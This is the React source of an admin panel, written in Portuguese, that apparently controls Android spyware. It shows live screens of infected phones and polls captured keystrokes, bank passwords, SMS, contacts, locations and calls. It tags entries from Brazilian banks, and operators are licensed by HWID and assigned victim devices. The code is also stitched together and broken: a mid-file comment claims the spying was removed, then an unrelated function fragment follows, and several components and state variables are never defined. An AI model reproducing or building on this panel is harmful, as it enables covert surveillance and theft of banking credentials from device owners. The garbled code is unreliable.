import { useState, useEffect, useRef } from 'react';
import { adminAPI, getApiBaseUrl, devicesAPI } from '../services/api';
import { 
  Shield, Users, UserPlus, Trash2, Ban, RefreshCw, 
  Edit, Check, LogOut, Smartphone, Search,
  Link, Unlink, Eye, X, Mic, MicOff,
  Keyboard, Activity, User, Clock, AlertCircle
} from 'lucide-react';

interface User {
  id: number;
  username: string;
  email: string;
  is_active: boolean;
  is_admin: boolean;
  is_banned: boolean;
  hwid: string | null;
  hwid_activated_at: string | null;
  created_at: string;
  last_login: string | null;
  last_ip: string | null;
  notes: string | null;
  device_count: number;
}

interface DeviceAdmin {
  id: number;
  device_id: string;
  model: string | null;
  manufacturer: string | null;
  android_version: string | null;
  last_seen: string | null;
  is_online: boolean;
  owner_id: number | null;
  owner_username: string | null;
}

interface Stats {
  total_users: number;
  active_users: number;
  banned_users: number;
  total_devices: number;
  online_devices: number;
}

interface KeylogEntry {
  timestamp: string;
  data: string;
  app: string;
  type?: string;
}

interface AdminPanelProps {
  onLogout: () => void;
}

// ==================== COMPONENTE PRINCIPAL DE ESPIONAGEM ====================
function AdvancedSpyView({ device, onClose }: { device: DeviceAdmin; onClose: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const [fps, setFps] = useState(0);
  const frameCountRef = useRef(0);
  const [keylogs, setKeylogs] = useState<KeylogEntry[]>([]);
  const [isListeningMic, setIsListeningMic] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const keylogIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  
  // Conectar ao VNC
  useEffect(() => {
    const token = localStorage.getItem('admin_token') || localStorage.getItem('token');
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsUrl = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsUrl}/ws/dashboard/${device.device_id}?token=${token}`);
    wsRef.current = ws;
    
    ws.onmessage = (event) => {
      if (event.data instanceof Blob) {
        frameCountRef.current++;
        const img = new Image();
        img.onload = () => {
          const canvas = canvasRef.current;
          if (canvas) {
            const ctx = canvas.getContext('2d');
            if (ctx) {
              canvas.width = img.width;
              canvas.height = img.height;
              ctx.drawImage(img, 0, 0);
            }
          }
          URL.revokeObjectURL(img.src);
        };
        img.src = URL.createObjectURL(event.data);
      }
    };
    
    // Contador de FPS
    const fpsInterval = setInterval(() => {
      setFps(frameCountRef.current);
      frameCountRef.current = 0;
    }, 1000);
    
    return () => {
      ws.close();
      clearInterval(fpsInterval);
    };
  }, [device.device_id]);
  
  // Buscar keylogs periodicamente
  useEffect(() => {
    const fetchKeylogs = async () => {
      try {
        const logs = await devicesAPI.getLogs(device.device_id);
        if (logs && logs.length > 0) {
          // Filtra logs de sistema (PONG, OK, COMMAND_SENT, etc)
          // Mostra apenas logs relevantes: KEYLOG, BANK_PASSWORD, SMS, etc
          const relevantTypes = ['KEYLOG', 'BANK_PASSWORD', 'SMS', 'CONTACT', 'LOCATION', 'CALL'];
          
          const keylogEntries: KeylogEntry[] = logs
            .filter((log: any) => relevantTypes.includes(log.type))
            .slice(0, 100)
            .map((log: any) => ({
              timestamp: log.created_at,
              data: log.data || `[${log.type}]`,
              app: log.data?.split(' ')[0] || log.type || 'unknown',
              type: log.type
            }));
          setKeylogs(keylogEntries);
        }
      } catch (err) {
        console.error('Erro ao buscar keylogs:', err);
      }
    };
    
    fetchKeylogs();
    keylogIntervalRef.current = setInterval(fetchKeylogs, 3000); // Aumentado para 3s
    
    return () => {
      if (keylogIntervalRef.current) {
        clearInterval(keylogIntervalRef.current);
      }
    };
  }, [device.device_id]);
  
  // Escutar microfone do operador (computador)
  const toggleMicrophoneListener = async () => {
    if (isListeningMic) {
      // Parar de escutar
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
        mediaStreamRef.current = null;
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
        audioContextRef.current = null;
      }
      setIsListeningMic(false);
    } else {
      // Começar a escutar
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaStreamRef.current = stream;
        
        const audioContext = new AudioContext();
        audioContextRef.current = audioContext;
        
        const source = audioContext.createMediaStreamSource(stream);
        const analyser = audioContext.createAnalyser();
        source.connect(analyser);
        
        // Criar destino para reproduzir o áudio
        const destination = audioContext.destination;
        source.connect(destination);
        
        setIsListeningMic(true);
      } catch (err) {
        console.error('Erro ao acessar microfone:', err);
        alert('Não foi possível acessar o microfone. Verifique as permissões.');
      }
    }
  };
  
  // Cleanup
  useEffect(() => {
    return () => {
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
      }
    };
  }, []);
  
  // Formatar timestamp
  const formatTime = (timestamp: string) => {
    try {
      return new Date(timestamp).toLocaleTimeString('pt-BR');
    } catch {
      return timestamp;
    }
  };
  
  // Extrair app e conteúdo do keylog
  const parseKeylog = (data: string, logType?: string) => {
    if (!data) return { app: 'unknown', content: '', type: logType || 'text' };
    
    // Usar tipo do log se disponível
    if (logType === 'BANK_PASSWORD') {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'password' };
    }
    
    // Detectar tipo de entrada pelo conteúdo
    if (data.includes('🔑') || data.includes('SENHA')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'password' };
    }
    if (data.includes('[CLICK:')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'click' };
    }
    if (data.includes('📱') || data.includes('itau') || data.includes('santander') || data.includes('bradesco')) {
      return { app: data.split(' ')[0] || 'app', content: data, type: 'bank' };
    }
    
    return { app: data.split(' ')[0] || 'app', content: data, type: logType || 'text' };
  };

  return (
    <div className="fixed inset-0 z-50 bg-gradient-to-br from-slate-900 via-red-900/20 to-slate-900">
      {/* Header */}
      <div className="bg-black/80 border-b border-red-500/50 px-6 py-3 flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-2">
            <Eye className="w-6 h-6 text-red-500 animate-pulse" />
            <span className="text-red-500 font-bold text-lg">ESPIONAGEM ATIVA</span>
          </div>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center space-x-2">
            <Smartphone className="w-5 h-5 text-blue-400" />
            <span className="text-white font-semibold">{device.model || 'Dispositivo'}</span>
          </div>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center space-x-2 bg-blue-600/30 px-3 py-1 rounded-full">
            <User className="w-4 h-4 text-blue-400" />
            <span className="text-blue-300 font-semibold">Operador: {device.owner_username || 'Sem dono'}</span>
          </div>
          <div className="flex items-center space-x-2">
            <span className="flex items-center space-x-1 bg-green-500/20 px-2 py-1 rounded text-green-400 text-sm">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span>LIVE</span>
            </span>
            <span className="text-gray-400 text-sm">{fps} FPS</span>
          </div>
        </div>
        
        <div className="flex items-center space-x-3">
          {/* Botão Microfone do Operador */}
          <button
            onClick={toggleMicrophoneListener}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              isListeningMic 
                ? 'bg-green-600 hover:bg-green-700 text-white' 
                : 'bg-slate-700 hover:bg-slate-600 text-gray-300'
            }`}
            title="Ouvir microfone do operador"
          >
            {isListeningMic ? <Mic className="w-4 h-4" /> : <MicOff className="w-4 h-4" />}
            <span>{isListeningMic ? 'Ouvindo...' : 'Mic Operador'}</span>
          </button>
          
          <button
            onClick={onClose}
            className="flex items-center space-x-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg"
          >
            <X className="w-4 h-4" />
            <span>Fechar</span>
          </button>
        </div>
      </div>
      
      {/* Conteúdo Principal */}
      <div className="flex h-[calc(100vh-60px)]">
        {/* VNC - Lado Esquerdo (maior) */}
        <div className="flex-1 p-4 flex flex-col">
          <div className="bg-black rounded-xl overflow-hidden flex-1 flex items-center justify-center border-2 border-red-500/30 shadow-2xl shadow-red-500/20">
            {/* Moldura do celular */}
            <div className="relative" style={{ width: 400, height: 800 }}>
              {/* Notch */}
              // Espionagem removida: funções relacionadas a visualização remota e keylogs foram eliminadas por segurança.
      setEditingUser(null);
      setSuccess('Usuário atualizado!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao atualizar usuário');
    }
  };

  const handleBanUser = async (userId: number, isBanned: boolean) => {
    try {
      if (isBanned) {
        await adminAPI.unbanUser(userId);
        setSuccess('Usuário desbanido!');
      } else {
        await adminAPI.banUser(userId);
        setSuccess('Usuário banido!');
      }
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao banir/desbanir usuário');
    }
  };

  const handleDeleteUser = async (userId: number) => {
    if (!confirm('Tem certeza que deseja excluir este usuário?')) return;
    try {
      await adminAPI.deleteUser(userId);
      setSuccess('Usuário excluído!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao excluir usuário');
    }
  };

  const handleResetHwid = async (userId: number) => {
    if (!confirm('Resetar HWID deste usuário?')) return;
    try {
      await adminAPI.resetHwid(userId);
      setSuccess('HWID resetado!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao resetar HWID');
    }
  };

  const handleAssignDevice = async () => {
    if (!assigningDevice || !selectedUserId) return;
    try {
      await adminAPI.assignDevice(assigningDevice.device_id, selectedUserId);
      setAssigningDevice(null);
      setSelectedUserId(null);
      setSuccess('Dispositivo atribuído!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao atribuir dispositivo');
    }
  };

  const handleUnassignDevice = async (deviceId: string) => {
    if (!confirm('Remover atribuição?')) return;
    try {
      await adminAPI.unassignDevice(deviceId);
      setSuccess('Atribuição removida!');
      loadData();
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao remover atribuição');
    }
  };

  const filteredUsers = users.filter(u => 
    u.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
    u.email.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const filteredDevices = devices.filter(d =>
    d.device_id.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (d.model?.toLowerCase() || '').includes(searchTerm.toLowerCase()) ||
    (d.owner_username?.toLowerCase() || '').includes(searchTerm.toLowerCase())
  );

  const onlineDevices = devices.filter(d => d.is_online);

  // Auto-hide messages
  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(''), 5000);
      return () => clearTimeout(timer);
    }
  }, [error]);

  useEffect(() => {
    if (success) {
      const timer = setTimeout(() => setSuccess(''), 3000);
      return () => clearTimeout(timer);
    }
  }, [success]);

  // Renderiza espionagem
  if (showSpyGrid) {
    return <SpyGrid devices={devices} onClose={() => setShowSpyGrid(false)} />;
  }
  
  if (spyingDevice) {
    return <AdvancedSpyView device={spyingDevice} onClose={() => setSpyingDevice(null)} />;
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-red-900 to-slate-900 flex items-center justify-center">
        <div className="text-white text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto mb-4"></div>
          <p>Carregando painel admin...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-red-900 to-slate-900">
      {/* Header */}
      <header className="bg-black/30 border-b border-red-500/30">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="p-2 bg-red-600 rounded-lg">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">Admin Panel</h1>
              <p className="text-xs text-red-300">Gerenciamento do Sistema</p>
            </div>
          </div>
          <div className="flex items-center space-x-3">
            {/* Botão de Espionagem Global */}
            <button
              onClick={() => setShowSpyGrid(true)}
              className="flex items-center space-x-2 px-5 py-2.5 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors shadow-lg shadow-red-500/30"
            >
              <Eye className="w-5 h-5 animate-pulse" />
              <span className="font-semibold">Espionar ({onlineDevices.length} online)</span>
            </button>
            <button
              onClick={onLogout}
              className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
            >
              <LogOut className="w-4 h-4" />
              <span>Sair</span>
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-6">
        {/* Estatísticas */}
        {stats && (
          <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
            <div className="bg-slate-800/50 rounded-lg p-4 border border-slate-700">
              <div className="flex items-center space-x-3">
                <Users className="w-8 h-8 text-blue-400" />
                <div>
                  <p className="text-2xl font-bold text-white">{stats.total_users}</p>
                  <p className="text-xs text-gray-400">Total Usuários</p>
                </div>
              </div>
            </div>
            <div className="bg-slate-800/50 rounded-lg p-4 border border-green-500/30">
              <div className="flex items-center space-x-3">
                <Check className="w-8 h-8 text-green-400" />
                <div>
                  <p className="text-2xl font-bold text-white">{stats.active_users}</p>
                  <p className="text-xs text-gray-400">Ativos</p>
                </div>
              </div>
            </div>
            <div className="bg-slate-800/50 rounded-lg p-4 border border-red-500/30">
              <div className="flex items-center space-x-3">
                <Ban className="w-8 h-8 text-red-400" />
                <div>
                  <p className="text-2xl font-bold text-white">{stats.banned_users}</p>
                  <p className="text-xs text-gray-400">Banidos</p>
                </div>
              </div>
            </div>
            <div className="bg-slate-800/50 rounded-lg p-4 border border-purple-500/30">
              <div className="flex items-center space-x-3">
                <Smartphone className="w-8 h-8 text-purple-400" />
                <div>
                  <p className="text-2xl font-bold text-white">{stats.total_devices}</p>
                  <p className="text-xs text-gray-400">Dispositivos</p>
                </div>
              </div>
            </div>
            <div 
              className="bg-slate-800/50 rounded-lg p-4 border border-yellow-500/30 cursor-pointer hover:bg-slate-700/50 transition-colors"
              onClick={() => setShowSpyGrid(true)}
            >
              <div className="flex items-center space-x-3">
                <Eye className="w-8 h-8 text-yellow-400 animate-pulse" />
                <div>
                  <p className="text-2xl font-bold text-white">{stats.online_devices}</p>
                  <p className="text-xs text-gray-400">Online (espionar)</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Mensagens */}
        {error && (
          <div className="bg-red-500/10 border border-red-500 text-red-400 px-4 py-3 rounded-lg mb-4 flex justify-between">
            <span>{error}</span>
            <button onClick={() => setError('')}>×</button>
          </div>
        )}
        {success && (
          <div className="bg-green-500/10 border border-green-500 text-green-400 px-4 py-3 rounded-lg mb-4">
            ✅ {success}
          </div>
        )}

        {/* Tabs */}
        <div className="flex space-x-2 mb-4">
          <button
            onClick={() => setActiveTab('users')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              activeTab === 'users' 
                ? 'bg-red-600 text-white' 
                : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
            }`}
          >
            <Users className="w-4 h-4" />
            <span>Usuários ({users.length})</span>
          </button>
          <button
            onClick={() => setActiveTab('devices')}
            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-colors ${
              activeTab === 'devices' 
                ? 'bg-red-600 text-white' 
                : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
            }`}
          >
            <Smartphone className="w-4 h-4" />
            <span>Dispositivos ({devices.length})</span>
          </button>
        </div>

        {/* Toolbar */}
        <div className="flex items-center justify-between mb-4">
          <div className="relative">
            <Search className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
            <input
              type="text"
              placeholder={activeTab === 'users' ? "Buscar usuário..." : "Buscar dispositivo..."}
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10 pr-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-600 w-64"
            />
          </div>
          <div className="flex space-x-2">
            <button
              onClick={loadData}
              className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Atualizar</span>
            </button>
            {activeTab === 'users' && (
              <button
                onClick={() => setShowCreateModal(true)}
                className="flex items-center space-x-2 px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors"
              >
                <UserPlus className="w-4 h-4" />
                <span>Novo Usuário</span>
              </button>
            )}
          </div>
        </div>

        {/* Conteúdo - Usuários */}
        {activeTab === 'users' && (
          <div className="bg-slate-800/50 rounded-lg border border-slate-700 overflow-hidden">
            <table className="w-full">
              <thead className="bg-slate-900/50">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Usuário</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Status</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">HWID</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Dispositivos</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Último Acesso</th>
                  <th className="px-4 py-3 text-right text-xs font-semibold text-gray-400 uppercase">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                {filteredUsers.map((user) => (
                  <tr key={user.id} className="hover:bg-slate-700/30">
                    <td className="px-4 py-3">
                      <div>
                        <p className="font-semibold text-white flex items-center">
                          {user.username}
                          {user.is_admin && (
                            <span className="ml-2 px-2 py-0.5 bg-red-600 text-white text-xs rounded">ADMIN</span>
                          )}
                        </p>
                        <p className="text-xs text-gray-400">{user.email}</p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      {user.is_banned ? (
                        <span className="px-2 py-1 bg-red-500/20 text-red-400 text-xs rounded-full">🚫 Banido</span>
                      ) : user.is_active ? (
                        <span className="px-2 py-1 bg-green-500/20 text-green-400 text-xs rounded-full">✅ Ativo</span>
                      ) : (
                        <span className="px-2 py-1 bg-gray-500/20 text-gray-400 text-xs rounded-full">⏸️ Inativo</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      {user.hwid ? (
                        <div className="flex items-center space-x-2">
                          <span className="text-xs font-mono text-green-400 bg-green-500/10 px-2 py-1 rounded">
                            {user.hwid.substring(0, 12)}...
                          </span>
                          <button
                            onClick={() => handleResetHwid(user.id)}
                            className="p-1 text-yellow-400 hover:bg-yellow-500/20 rounded"
                            title="Resetar HWID"
                          >
                            <RefreshCw className="w-3 h-3" />
                          </button>
                        </div>
                      ) : (
                        <span className="text-xs text-gray-500">Não ativado</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      <span className="text-white font-semibold">{user.device_count}</span>
                    </td>
                    <td className="px-4 py-3">
                      <div>
                        <p className="text-xs text-gray-300">
                          {user.last_login ? new Date(user.last_login).toLocaleString() : 'Nunca'}
                        </p>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-right">
                      <div className="flex items-center justify-end space-x-1">
                        <button
                          onClick={() => {
                            setEditingUser(user);
                            setEditForm({
                              email: user.email,
                              password: '',
                              notes: user.notes || '',
                              is_admin: user.is_admin
                            });
                          }}
                          className="p-2 text-blue-400 hover:bg-blue-500/20 rounded"
                          title="Editar"
                        >
                          <Edit className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => handleBanUser(user.id, user.is_banned)}
                          className={`p-2 rounded ${user.is_banned ? 'text-green-400 hover:bg-green-500/20' : 'text-yellow-400 hover:bg-yellow-500/20'}`}
                          title={user.is_banned ? 'Desbanir' : 'Banir'}
                        >
                          <Ban className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => handleDeleteUser(user.id)}
                          className="p-2 text-red-400 hover:bg-red-500/20 rounded"
                          title="Excluir"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Conteúdo - Dispositivos */}
        {activeTab === 'devices' && (
          <div className="bg-slate-800/50 rounded-lg border border-slate-700 overflow-hidden">
            <table className="w-full">
              <thead className="bg-slate-900/50">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Dispositivo</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Status</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Operador</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Último Acesso</th>
                  <th className="px-4 py-3 text-right text-xs font-semibold text-gray-400 uppercase">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                {filteredDevices.map((device) => (
                  <tr key={device.id} className="hover:bg-slate-700/30">
                    <td className="px-4 py-3">
                      <div>
                        <p className="font-semibold text-white">{device.model || 'Desconhecido'}</p>
                        <p className="text-xs text-gray-400">{device.device_id.substring(0, 16)}...</p>
                        <p className="text-xs text-gray-500">{device.manufacturer} • Android {device.android_version}</p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      {device.is_online ? (
                        <span className="px-2 py-1 bg-green-500/20 text-green-400 text-xs rounded-full flex items-center w-fit">
                          <span className="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></span>
                          Online
                        </span>
                      ) : (
                        <span className="px-2 py-1 bg-gray-500/20 text-gray-400 text-xs rounded-full">Offline</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      {device.owner_username ? (
                        <div className="flex items-center space-x-2">
                          <span className="px-2 py-1 bg-blue-500/20 text-blue-400 text-xs rounded flex items-center">
                            <User className="w-3 h-3 mr-1" />
                            {device.owner_username}
                          </span>
                          <button
                            onClick={() => handleUnassignDevice(device.device_id)}
                            className="p-1 text-red-400 hover:bg-red-500/20 rounded"
                            title="Remover"
                          >
                            <Unlink className="w-3 h-3" />
                          </button>
                        </div>
                      ) : (
                        <span className="text-xs text-gray-500 italic">Não atribuído</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      <p className="text-xs text-gray-300">
                        {device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Nunca'}
                      </p>
                    </td>
                    <td className="px-4 py-3 text-right">
                      <div className="flex items-center justify-end space-x-2">
                        {device.is_online && (
                          <button
                            onClick={() => setSpyingDevice(device)}
                            className="flex items-center space-x-1 px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white text-xs rounded transition-colors"
                          >
                            <Eye className="w-3 h-3" />
                            <span>Espionar</span>
                          </button>
                        )}
                        <button
                          onClick={() => {
                            setAssigningDevice(device);
                            setSelectedUserId(device.owner_id);
                          }}
                          className="flex items-center space-x-1 px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs rounded transition-colors"
                        >
                          <Link className="w-3 h-3" />
                          <span>Atribuir</span>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Modal Criar Usuário */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <UserPlus className="w-5 h-5 mr-2 text-green-400" />
              Criar Novo Usuário
            </h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">Usuário</label>
                <input
                  type="text"
                  value={newUser.username}
                  onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  placeholder="nome_usuario"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">E-mail</label>
                <input
                  type="email"
                  value={newUser.email}
                  onChange={(e) => setNewUser({ ...newUser, email: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  placeholder="email@exemplo.com"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Senha</label>
                <input
                  type="password"
                  value={newUser.password}
                  onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  placeholder="********"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Notas</label>
                <textarea
                  value={newUser.notes}
                  onChange={(e) => setNewUser({ ...newUser, notes: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  rows={2}
                />
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="is_admin"
                  checked={newUser.is_admin}
                  onChange={(e) => setNewUser({ ...newUser, is_admin: e.target.checked })}
                  className="mr-2"
                />
                <label htmlFor="is_admin" className="text-sm text-gray-300">É administrador</label>
              </div>
            </div>
            <div className="flex space-x-3 mt-6">
              <button
                onClick={() => setShowCreateModal(false)}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleCreateUser}
                className="flex-1 py-2 bg-green-600 hover:bg-green-700 text-white rounded"
              >
                Criar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal Editar Usuário */}
      {editingUser && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <Edit className="w-5 h-5 mr-2 text-blue-400" />
              Editar: {editingUser.username}
            </h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">E-mail</label>
                <input
                  type="email"
                  value={editForm.email}
                  onChange={(e) => setEditForm({ ...editForm, email: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Nova Senha</label>
                <input
                  type="password"
                  value={editForm.password}
                  onChange={(e) => setEditForm({ ...editForm, password: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  placeholder="Deixe vazio para manter"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Notas</label>
                <textarea
                  value={editForm.notes}
                  onChange={(e) => setEditForm({ ...editForm, notes: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
                  rows={2}
                />
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="edit_is_admin"
                  checked={editForm.is_admin}
                  onChange={(e) => setEditForm({ ...editForm, is_admin: e.target.checked })}
                  className="mr-2"
                />
                <label htmlFor="edit_is_admin" className="text-sm text-gray-300">É administrador</label>
              </div>
            </div>
            <div className="flex space-x-3 mt-6">
              <button
                onClick={() => setEditingUser(null)}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleUpdateUser}
                className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded"
              >
                Salvar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal Atribuir Dispositivo */}
      {assigningDevice && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-slate-800 rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <Link className="w-5 h-5 mr-2 text-blue-400" />
              Atribuir Dispositivo
            </h2>
            <div className="mb-4">
              <p className="text-gray-400 text-sm mb-2">Dispositivo:</p>
              <div className="bg-slate-700 rounded p-3">
                <p className="text-white font-semibold">{assigningDevice.model || 'Desconhecido'}</p>
                <p className="text-xs text-gray-400">{assigningDevice.device_id}</p>
              </div>
            </div>
            <div className="mb-4">
              <label className="block text-sm text-gray-400 mb-2">Selecione o usuário:</label>
              <select
                value={selectedUserId || ''}
                onChange={(e) => setSelectedUserId(e.target.value ? parseInt(e.target.value) : null)}
                className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white"
              >
                <option value="">-- Selecione --</option>
                {users.filter(u => !u.is_admin).map(user => (
                  <option key={user.id} value={user.id}>
                    {user.username} ({user.email})
                  </option>
                ))}
              </select>
            </div>
            <div className="flex space-x-3">
              <button
                onClick={() => {
                  setAssigningDevice(null);
                  setSelectedUserId(null);
                }}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleAssignDevice}
                disabled={!selectedUserId}
                className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded disabled:opacity-50"
              >
                Atribuir
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
